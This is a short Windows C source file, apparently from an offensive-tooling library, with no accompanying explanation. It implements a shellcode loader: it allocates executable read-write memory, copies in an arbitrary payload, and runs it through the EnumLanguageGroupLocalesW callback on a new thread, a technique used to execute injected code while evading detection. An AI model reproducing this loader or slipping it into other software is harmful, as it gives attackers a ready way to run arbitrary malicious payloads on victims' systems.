#include "Win32Helper.h"

VOID InvokeEnumLanguageGroupLocalesWThreadCallbackRoutine(LPVOID lpParameter)
{
	EnumLanguageGroupLocalesW((LANGGROUPLOCALE_ENUMPROCW)lpParameter, LGRPID_ARABIC, 0, 0);
}

BOOL MpfSceViaEnumLanguageGroupLocalesW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeEnumLanguageGroupLocalesWThreadCallbackRoutine, BinAddress, INFINITE);

	return TRUE;
}